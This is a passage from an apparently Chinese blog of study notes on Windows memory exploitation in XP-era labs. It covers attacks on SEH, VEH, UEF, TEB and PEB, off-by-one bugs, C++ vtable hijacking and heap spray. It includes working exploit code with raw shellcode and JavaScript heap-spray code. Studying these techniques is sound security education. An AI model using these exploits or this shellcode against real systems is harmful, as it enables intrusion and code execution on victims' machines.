class="line"><span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>);<span class="comment">// over flow here, noticed 0x200 means</span></span><br><span class="line"><span class="comment">//512 !</span></span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span> <span class="comment">// uesd to break the process</span></span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">__except(MyExceptionhandler())&#123;&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，在我在运行时，有问题，如下图<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419141859603.png" alt="image-20220419141859603"></p><p>这里执行了未知指令，也就是<code>F0:FE</code> ，查看内存可以发现，在地址<code>0x0036068C</code>处我们的 shellcode 已经被修改为了<code>F0 FE 12 00</code>。<br>这就是 DWORD SHOOT 后的 “指针反射” 现象，在双向链表拆除时第二次链表操作导致了 DWORD SHOOT。DWORD SHOOT 把目标地址 <code>0012FEFO</code> 写回 shellcode 起始位置偏移 4 个字节的地方 <code>0036068c</code>。</p><p>这里我们把 <code>F0 FE 12 00</code>修改为 <code>EB 02 12 00</code>（这里只要能够跳转后一条指令就行），使得 EIP 跳到了0x00360690处开始执行从而避免了指针反射造成的错误，如下图<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419143637686.png" alt="image-20220419143637686"></p><h2 id="深入挖掘-windows-异常处理"><a class="markdownIt-Anchor" href="#深入挖掘-windows-异常处理"></a> 深入挖掘 Windows 异常处理</h2><p><strong>（1）不同级别的 S.E.H</strong></p><p>异常处理的最小作用域是线程，每个线程都有自己的 S.E.H 链表。</p><p>异常处理流程 ：线程 —&gt; 进程 —&gt; 系统 —&gt; 终止</p><ul><li>首先执行线程中距离栈顶最近的 S.E.H 的异常处理函数。</li><li>若失败，则依次尝试执行 S.E.H 链表中后续的异常处理函数。</li><li>若 S.E.H 链中所有的异常处理函数都没能处理异常，则执行进程中的异常处理。</li><li>若仍然失败，系统默认的异常处理将被调用，其结果是显示错误对话框。</li></ul><p><strong>（2）线程的异常处理</strong></p><p>线程中异常处理的回调函数的<strong>参数</strong>和<strong>返回值</strong>（回调函数执行前，操作系统将断点信息压栈）：</p><ul><li><p>参数</p><ul><li><p><strong>pExcept</strong>：指向一个结构体 <strong>EXCEPTION_RECORD</strong>。该结构体包含了若干<br>与异常相关的信息，如异常的类型、异常发生的地址等。</p></li><li><p><strong>pFrame</strong>：指向栈帧中的 <strong>S.E.H</strong> 结构体。</p></li><li><p><strong>pContext</strong>：指向 <strong>Context</strong> 结构体。该结构体中包含了所有寄存器的状态。</p></li><li><p><strong>pDispatch</strong>：未知用途。</p></li></ul></li><li><p>返回值</p><ul><li><strong>0</strong> (ExceptionContinueExcetution)：代表<strong>异常处理成功</strong>，将返回原程序发生异常的地方，继续执行。</li><li><strong>1</strong> (ExceptinoContinueSearch)：代表<strong>异常处理失败</strong>，将顺着 S.E.H 链表搜索其它可用于异常处理的函数并尝试处理。</li></ul></li></ul><p>线程的异常处理中还有一个叫 <strong>unwind 操作</strong>。</p><p>unwind 定义：在异常发生时，系统会顺着 S.E.H链表搜索能处理异常的句柄；一旦找到，系统会把已经遍历过的异常处理函数再调用一遍，这个过程就是 unwind 操作，第二轮调用就是 unwind 调用。</p><p>unwind 目的：”通知“ 前面处理异常失败的 S.E.H 释放资源，之后这些 S.E.H 结构体将被从链表中拆除。进而避免进行多次异常处理。</p><p>unwind 操作确保了异常处理机制自身的完整性和正确性。下图是一个没有使用 unwind 操作而导致异常处理机制自身产生错误的例子。<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220421223548497.png" alt="image-20220421223548497"></p><p>异常处理函数第一轮调用，用来处理异常，第二轮的 unwind 调用时，释放资源。那么异常回调函数怎么直到自己是第几轮调用呢？</p><p>答案在回调函数的第一个参数 pExcept 所指向的 EXCEPTION_RECORD 结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span></span><br><span class="line">DWORD ExceptionCode;</span><br><span class="line">DWORD ExceptionFlags; <span class="comment">//异常标志位</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> *<span class="title">ExceptionRecord</span>;</span></span><br><span class="line">PVOID ExceptionAddress;</span><br><span class="line">DWORD NumberParameters;</span><br><span class="line">DWORD ExceptionInformation [EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure><p>当 ExceptionCode = 0xC0000027(STATUS_UNWIND)，ExceptionFlags = 2(EH_UNWINDING) 时，对回调函数的调用就属于 unwind 调用。</p><p>unwind 操作通过 kernerl.32 中的一个导出函数 RtlUnwind 实现，实际上 kernel32.dll 会转而再去调用 ntdll.dll 中的同名函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">RtlUnwind</span><span class="params">(</span></span><br><span class="line"><span class="params">PVOID TargetFrame,</span></span><br><span class="line"><span class="params">PVOID TargetIp,</span></span><br><span class="line"><span class="params">PEXCEPTION_RECORD ExceptionRecord,</span></span><br><span class="line"><span class="params">PVOID ReturnValue</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><blockquote><p>**补充：**在使用回调函数之前，系统会判断当前是否处于调试状态，如果处于调试状态，将把异常交给调试器处理。</p></blockquote><p><strong>（3）进程的异常处理</strong></p><p>进程的异常处理回调函数需要通过 API 函数 SetUnhandledExceptionFilter 来注册 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LPTOP_LEVEL_EXCEPTION_FILTER <span class="title function_">SetUnhandledExceptionFilter</span><span class="params">(</span></span><br><span class="line"><span class="params">LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><blockquote><p><strong>提示：</strong> 您可以简单地把线程异常处理对应为代码中的__try{} __ except(){}或者 Assert等语句，把进程的异常处理对应于函数 SetUnhandledExceptionFilter。</p></blockquote><p>进程的异常处理函数的<strong>返回值</strong>：</p><ul><li><strong>1</strong>（ EXCEPTION_EXECUTE_HANDLER）：表示错误得到正确的处理，程序将退出。</li><li><strong>0</strong>（ EXCEPTION_CONTINUE_SEARCH）：无法处理错误，将错误转交给系统默认的异常处理。</li><li><strong>-1</strong>（ EXCEPTION_CONTINUE_EXECUTION）：表示错误得到正确的处理，并将继续执行下去。类似于线程的异常处理，系统会用回调函数的参数恢复出异常发生时的断点状况，但这时引起异常的寄存器值应该已经得到了修复。</li></ul><p><strong>（4）系统默认的异常处理 U.E.F</strong></p><p>系统默认的异常处理函数 UnhandledExceptionFilter()，简称 【U.E.F】UnhandledExceptionFilter() 将首先检查注册表 HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\AeDebug 下的表项，如下图所示。<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220421231555943.png" alt="image-20220421231555943"></p><p>路径下的 <strong>Auto</strong> 表项代表<strong>是否弹出错误对话框</strong>，值为 1 表示不弹出错误对话框直接结束程序，其余值均会弹出提示错误的对话框。<br>注册表的 Debugger 指明了系统默认的调试器，在错误框弹出后，如果您选择调试，UnhandledExceptionFilter 就会按照这里的命令加载相应的调试器。</p><p><strong>（5）异常处理流程的总结</strong></p><p>windows 2000 异常处理的<strong>基本流程</strong>：</p><ul><li>CPU 执行时发生并捕获异常，内核接过进程的控制权，开始内核态的异常处理。</li><li>内核异常处理结束，将控制权还给 ring3。</li><li>ring3 中第一个处理异常的函数是 ntdll.dll 中的 KiUserExceptionDispatcher()函数。</li><li>KiUserExceptionDispatcher()首先<strong>检查</strong>程序是否处于<strong>调试状态</strong>。如果程序正在被调试，会将异常交给调试器进行处理。</li><li>在非调试状态下，KiUserExceptionDispatcher() 调用 RtlDispatchException()函数<strong>对线程的 S.E.H 链表进行遍历</strong>，如果找到能够处理异常的回调函数，将再次遍历先前调用过的 S.E.H 句柄，即 unwind 操作，以保证异常处理机制自身的完整性。</li><li>如果栈中所有的 S.E.H 都失败了，且用户曾经使用过 SetUnhandledExceptionFilter()函数设定进程异常处理，则这个异常处理将被调用，即<strong>调用用户自定义进程异常处理函数</strong>。</li><li>如果用户自定义的进程异常处理失败，或者用户根本没有定义进程异常处理，那么<strong>系统默认的异常处理 UnhandledExceptionFilter()将被调用</strong>。 U.E.F 会根据注册表里的相关信息决定是默默地关闭程序，还是弹出错误对话框。</li></ul><h2 id="其它异常处理机制的利用思路"><a class="markdownIt-Anchor" href="#其它异常处理机制的利用思路"></a> 其它异常处理机制的利用思路</h2><h3 id="veh-利用"><a class="markdownIt-Anchor" href="#veh-利用"></a> V.E.H 利用</h3><p>从 Windows XP 开始，在原来的异常处理机制上增加了一种<strong>新的异常处理</strong>：<strong>V.E.H</strong>  ( Vectored Exception Handler，<strong>向量化异常处理</strong> )。</p><p><strong>V.E.H 要点：</strong></p><p>（1）V.E.H 使用 API 注册回调函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PVOID <span class="title function_">AddVectoredExceptionHandler</span><span class="params">(</span></span><br><span class="line"><span class="params">ULONG FirstHandler,</span></span><br><span class="line"><span class="params">PVECTORED_EXCEPTION_HANDLER VectoredHandler</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>（2）V.E.H 结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">VECTORED_EXCEPTION_NODE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">DWORD m_pNextNode;</span><br><span class="line">DWORD m_pPreviousNode;</span><br><span class="line">PVOID m_pfnVectoredHandler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（3）可以注册多个 V.E.H，V.E.H结构体间串成双向链表，保存在堆中。</p><p>（4）调用顺序：KiUserExceptionDispatcher() 首先检查是否被调试，然后检查 V.E.H 链表，最后检查 S.E.H 链表。</p><p>（5）注册 V.E.H 时，可以指定其在链表中的位置，不必像 S.E.H 按照注册顺序压栈。</p><p>（6）unwind 操作只对栈帧中的 S.E.H链起作用，不涉及 V.E.H</p><p>**V.E.H 利用思路：**如果能用堆溢出的 DWORD SHOOT 修改指向 V.E.H 头结点的指针，在异常处理开始后，就能引导程序执行 shellcode 了。</p><p><strong>标识 V.E.H 链表头节点的指针位于 <code>0x77FC3210</code></strong></p><h3 id="攻击-teb-中的-seh-头节点"><a class="markdownIt-Anchor" href="#攻击-teb-中的-seh-头节点"></a> 攻击 TEB 中的 S.E.H 头节点</h3><p>**攻击思路：**线程的 S.E.H 链通过 TEB 的第一个 DWORD 标识(fs:0)，这个指针永远指向离栈顶最近的那个 S.E.H。如果能够修改 TEB 中的这个指针，在异常发生时就能将程序引导到 shellcode 中去执行。</p><p><strong>TEB（线程环境块）要点：</strong></p><p>（1）一个进程可能同时存在多个线程。</p><p>（2）每个线程都有一个线程环境块 TEB。</p><p>（3）第一个 TEB 开始于 <code>0x7FFDE000</code>。</p><p>（4）之后新建线程的 TEB 紧随前边的 TEB ，相隔 <code>0x1000</code>字节，并向内存低址方向增长。</p><p>（5）当线程退出时，对应的 TEB 也被销毁，腾出的 TEB 空间可以被新建的线程重复使用。<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220423170845384.png" alt="image-20220423170845384"></p><p>攻击 TEB 中 S.E.H 头节点的方法一般用于单线程的程序，不适合攻击多线程的程序，是因为，多线程的 TEB 很难判断到底是哪一个线程的。</p><h3 id="攻击uef"><a class="markdownIt-Anchor" href="#攻击uef"></a> 攻击U.E.F</h3><p>U.E.F【UnhandledExceptionFilter()】即系统默认的异常处理函数，是系统处理异常的最后一个环节。</p><p>由于 U.E.F 句柄在不同操作系统和补丁版本下可能不同，所以在攻击前需要确定 U.E.F 句柄，即反汇编（用IDA）kernel32.dll 中的导出函数 SetUnhandledExceptionFilter()。</p><p>补充：U.E.F 利用时，结合使用跳板技术能使 exploit 成功率更高。</p><p>异常发生时，EDI 往往仍然指向堆中离 shellcode 不远处，把 U.E.F 的句柄覆盖成一条 <code>call dword ptr [edi+0x78]</code>的指令地址往往能让程序跳到 shellcode 中。其它具有定位 shellcode 的指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call dword ptr [ESI+0x4C]</span><br><span class="line">call dword ptr [EBP+0x74]</span><br></pre></td></tr></table></figure><p>此外，EDI的跳转并不能保证百分之百成功。</p><h3 id="攻击-peb-中的函数指针"><a class="markdownIt-Anchor" href="#攻击-peb-中的函数指针"></a> 攻击 PEB 中的函数指针</h3><p><strong>PEB 的位置永远不变。</strong></p><p>上一次堆溢出的最后一个实验中，通过 DWORD SHOOT 修改 PEB 中函数地址，那么当调用函数时，程序就被我们引导去执行 shellcode 代码。</p><h1 id="off-by-one-的利用"><a class="markdownIt-Anchor" href="#off-by-one-的利用"></a> “off by one” 的利用</h1><p>Halvar Flake 在“ Third Generation Exploitation”中，按照攻击的难度把漏洞利用技术分成 3个层次。<br>（ 1）第一类是<strong>基础的栈溢出利用</strong>。攻击者可以利用返回地址等轻松劫持进程，植入 shellcode，例如，对 strcpy、 strcat 等函数的攻击等。<br>（ 2）第二类是<strong>高级的栈溢出利用</strong>。这时，栈中有诸多的限制因素，溢出数据往往只能淹没部分的 EBP，而无法抵达返回地址的位置。这种漏洞利用的典型例子就是对 strncpy 函数误用时产生的 “off by one” 漏洞的利用。<br>（ 3）第三类攻击则是<strong>堆溢出利用及格式化串漏洞的利用</strong>。</p><p>off by one 的利用代码示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">off_by_one</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>,len=<span class="number">0</span>;</span><br><span class="line">len=<span class="keyword">sizeof</span>(buf);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; input[i]&amp;&amp;(i&lt;=len); i++) <span class="comment">//这里应该是i&lt;len</span></span><br><span class="line">&#123;</span><br><span class="line">buf[i]=input[i];</span><br><span class="line">&#125;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第 6 行代码中，循环条件中的<code>i&lt;=len</code>就给攻击者一个字节的溢出机会。这种边界控制上的错误就是 “off by one” 问题。</p><p>这时，如果缓冲区后面紧跟着 EBP 和返回地址，那么这溢出的一个字节，将有机会覆盖 EBP 的最低位字节，也就是说我们能在255个字节的范围内移动 EBP，让程序执行我们指定位置的恶意代码。</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419215423173.png" alt="image-20220419215423173"></p><p>此外，off by one 可能破坏重要的临界变量，从而导致程序流程改变，或者整数溢出等更深层次的问题。</p><h1 id="攻击-c-的虚函数"><a class="markdownIt-Anchor" href="#攻击-c-的虚函数"></a> 攻击 C++ 的虚函数</h1><p>虚函数与虚表的要点：<br>（ 1）用关键字 virtual 修饰声名的类成员函数，叫虚函数</p><p>​（ 2）一个类用可能有多个虚函数</p><p>​（ 3）虚表（vatable）中保存着类的所有虚函数的入口地址。</p><p>​（ 4）对象使用虚函数时，先通过虚表指针找到虚表，然后从虚表中找到虚函数的入口地址。</p><p>​（ 5）虚表指针保存在对象的内存空间中，与其它成员变量相邻。</p><p>​（ 6）虚函数只有通过对象指针的引用才能显示其动态调用的特性。</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419215625216.png" alt="image-20220419215625216"></p><p>如果能<strong>溢出</strong>对象的<strong>成员变量</strong>，就有机会修改<strong>虚表指针</strong>或修改虚表中的<strong>虚函数指针</strong>，从而运行 shellcode</p><h2 id="实现代码即相关说明"><a class="markdownIt-Anchor" href="#实现代码即相关说明"></a> 实现代码即相关说明</h2><p>表 6-3-1 实验环境</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows XP SP2</td><td>其他 Win32 操作系统也可进行本实验</td></tr><tr><td>编译器</td><td>Visual C++ 6.0</td><td></td></tr><tr><td>编译选项</td><td>默认编译选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><p>说明： 伪造的虚表指针和虚函数指针依赖于实验机器，可能需要通过动态调试重新确定，您也可以通过在程序中简单地打印出 overflow.buf 的地址，从而计算出这两个值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;iostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x44\xE2\x42\x00&quot;</span>;<span class="comment">//set fake virtual function pointer</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Failwest</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;Class Vtable::test()&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">Failwest overflow, *p;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> * p_vtable;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,overflow.buf);</span><br><span class="line">p_vtable=overflow.buf<span class="number">-4</span>;<span class="comment">//point to virtual table</span></span><br><span class="line"><span class="comment">//__asm int 3</span></span><br><span class="line"><span class="comment">//reset fake virtual table to 0x004088cc</span></span><br><span class="line"><span class="comment">//the address may need to ajusted via runtime debug</span></span><br><span class="line">p_vtable[<span class="number">0</span>]=<span class="number">0xf4</span>;</span><br><span class="line">p_vtable[<span class="number">1</span>]=<span class="number">0xe2</span>;</span><br><span class="line">p_vtable[<span class="number">2</span>]=<span class="number">0x42</span>;</span><br><span class="line">p_vtable[<span class="number">3</span>]=<span class="number">0x00</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(overflow.buf,shellcode);<span class="comment">//set fake virtual function pointer</span></span><br><span class="line">p=&amp;overflow;</span><br><span class="line">p-&gt;<span class="built_in">test</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>代码说明：</strong><br>（ 1）虚表指针位于 char buf[200] 之前，通过 p_vtable = overflow.buf - 4 定位这个指针。</p><p>​（ 2）修改<strong>虚表指针</strong>指向缓冲区的 <code>0x0042e2f4</code> 处，把<code>0x0042e2f4</code>里存放的内容当作<strong>虚函数指针</strong>，即<code>0042e244</code></p><p>​（ 3）程序执行到 p-&gt;rest() 时，将会把<code>0x0042e2f4</code>处的内容取出，即 <code>0x0042e244</code> ，然后把它当作函数的入口地址，进而去执行 <code>0x0042e244</code> 处的指令，即我们的 shellcode 代码。</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419221608706.png" alt="image-20220419221608706"></p><p>运行程序后出现的结果：</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220420100115219.png" alt="image-20220420100115219"></p><p>由于虚表指针位于成员变量前，溢出只能向后覆盖数据，所以这种利用方式在 “数组溢出”或“连续性覆盖” 的场景下有局限。</p><p>当然，如果<strong>内存中有多个对象且能溢出到下一个对象空间中去</strong>，“连续性覆盖” 还是有攻击机会的，如下图<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220420104319811.png" alt="image-20220420104319811"></p><h1 id="heap-spray堆与栈的协同攻击"><a class="markdownIt-Anchor" href="#heap-spray堆与栈的协同攻击"></a> Heap Spray：堆与栈的协同攻击</h1><p>攻击浏览器时，常常结合使用堆和栈的协同利用漏洞。</p><p>（1）当浏览器或插件中<strong>存在溢出漏洞</strong>时，攻击者就可以生成一个特殊的 HTML 文件来触发这个漏洞。</p><p>（2）漏洞触发后最终都能获得 EIP</p><p>（3）有时我们很难在浏览器中布置完整的 shellcode</p><p>（4）JavaScript 可以申请堆内存，所以，把 shellcode 通过 JavaScript 布置在堆中。</p><p>如何定位 shellcode 呢？Heap Spray 技术就是为了解决这个问题。</p><p>**攻击思路：**在使用 Heap Spray时，一般会人为的把 EIP 指向堆区的 <code>0x0C0C0C0C</code> 位置，然后用 JavaScript 申请大量堆内存，并用包含着 0x90 和 shellcode 的 ”内存片“ 覆盖这些内存。</p><p>JavaScript 会从内存低址向高址分配内存，因此申请内存超过 200MB（200MB = 200*1024*1024 = 0x0C800000 &gt; 0x0C0C0C0C）后，0x0C0C0C0C 将被含有 shellcode 的内存片覆盖。只要 0x90 能命中 0x0C0C0C0C 的位置，shellcode 最终就能执行。<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220423205602972.png" alt="image-20220423205602972"></p><p>使用下面 JavaScript 代码产生的内存片来覆盖内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var nop=unescape(<span class="string">&quot;%u9090%u9090&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (nop.length&lt;= <span class="number">0x100000</span>/<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">nop+=nop;</span><br><span class="line">&#125;<span class="comment">//生成一个 1MB 大小充满 0x90 的数据块</span></span><br><span class="line">nop = nop.substring(<span class="number">0</span>, <span class="number">0x100000</span>/<span class="number">2</span> - <span class="number">32</span>/<span class="number">2</span> - <span class="number">4</span>/<span class="number">2</span> - shellcode.length - <span class="number">2</span>/<span class="number">2</span> );</span><br><span class="line">var slide = new Arrary();</span><br><span class="line"><span class="keyword">for</span> (var i=<span class="number">0</span>; i&lt;<span class="number">200</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">slide[i] = nop + shellcode</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码说明：</p><p>（1）每个内存片大小为 1MB</p><p>（2）首先产生一个大小为 1MB 且全部被 0x90 填满的内存。</p><p>（3）由于 JavaScript 会为申请到的内存填上一些额外的信息，为了保证内存片恰好是 1MB，我们将这些额外信息所占的空间减去。</p><table><thead><tr><th>额外信息</th><th>SIZE</th><th>说 明</th></tr></thead><tbody><tr><td>malloc header</td><td>32 bytes</td><td>堆块信息</td></tr><tr><td>string length</td><td>4 bytes</td><td>表示字符串长度</td></tr><tr><td>terminator</td><td>2 bytes</td><td>字符串结束符，两个字节的 NULL</td></tr></tbody></table><p>（4）最终我们将使用 200 个这种形式的内存片来覆盖堆内存，只要其中任意一片的 nop 区能够覆盖 0x0C0C0C0C，攻击就可以成功</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220423210203879.png" alt="image-20220423210203879"></p><p>**为什么采用 1MB 大小作为内存片的单位呢？**在 Heap Spray 时，内存片相对于 shellcode 和额外的内存信息来说应该“足够大”，这样 nop 区域命中 <code>0x0C0C0C0C</code> 的几率将相对增加；如果内存片较小， shellcode 或额外的内存信息将有可能覆盖 